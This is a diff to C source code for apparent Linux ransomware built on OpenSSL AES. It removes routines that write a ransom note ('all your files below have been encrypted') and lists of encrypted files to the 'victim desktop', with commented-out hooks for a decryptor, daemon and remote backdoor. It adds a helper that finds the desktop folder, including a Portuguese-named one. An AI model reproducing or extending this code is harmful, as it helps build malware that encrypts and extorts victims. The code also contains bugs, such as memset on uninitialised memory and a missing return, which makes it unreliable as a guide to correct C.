@@ -9,6 +9,7 @@
 #include<unistd.h>
 #include<stdio.h>
 #include <pwd.h>
+#include <sys/stat.h>
 #include<openssl/aes.h>
 #include<openssl/evp.h>
 
@@ -64,55 +65,6 @@ void find_files(List **files, char* start_path){
             }
         }
     }
-}
-
-/**
- * This function will save things on the victim desktop
- * such as enc_files.gc, public key, private key.
- * This file will be used to decrypt.
- * @param encrypted -> type = List
- * @param files -> type = List
- */
-void create_files_desktop(List *encrypted, List *files, char * desktop){
-    save_into_file_encrypted_list(encrypted, desktop);
-    save_into_file_files_list(files, desktop);
-    //create_decryptor(desktop);
-    //create_daemon_process();
-    //create_remote_backdoor();
-}
-
-/**
- * This function will save the original files path 
- * on the victim desktop
- * @param l -> type = List
- */
-void save_into_file_files_list(List *l, char *desktop){
-    FILE *f;
-    char * new_file;
-    char *line;
-    char *string = "Sup brother, all your files below have been encrypted, cheers!\n";
-    if(l == NULL){
-        return;
-    }
-
-    new_file = (char*)malloc(sizeof(char) * (strlen(desktop) + 26));
-    strcpy(new_file, desktop);
-    strcat(new_file, "your_encrypted_files.txt");
-
-    f = fopen(new_file, "w");
-    fwrite(string, strlen(string), 1, f);
-    while(l != NULL){
-        line = malloc((sizeof(char)*strlen(l->info[2]) + 11));
-        memset(line, 0, strlen(line));
-        strcpy(line, l->info[2]);
-        strcat(line, "\n");
-        fwrite(line, strlen(line), 1, f);
-
-        l = l->prox;
-    }
-    free(line);
-    free(new_file);
-    fclose(f);
 }
 
 /**
@@ -296,7 +248,19 @@ char * get_desktop_enviroment(char *home){
     char * path = (char *)malloc((sizeof(char)*strlen(home) + 9));
     strcpy(path, home);
     strcat(path, "Desktop/");
-    return path;
+    if(is_path(path)){
+        return path;
+    }
+
+    free(path);
+    path = (char *)malloc((sizeof(char)*strlen(home) + 20));
+    
+    strcpy(path, home);
+    strcat(path, "Área de Trabalho/");
+    if(is_path(path)){
+        return path;
+    }
+    
 }
 
 char * get_test_path(char * desktop){
@@ -304,6 +268,20 @@ char * get_test_path(char * desktop){
     strcpy(path, desktop);
     strcat(path, "tests/");
     return path;
+}
+
+/**
+ * This function check if the generated path exists
+ * @param home -> type = char * (String)
+ * @return -> type = char * (String)
+ */
+bool is_path(char *path){
+    DIR* dir = opendir(path);
+    if (dir){
+        closedir(dir);
+        return true;
+    }
+    return false;
 }
 
 /**
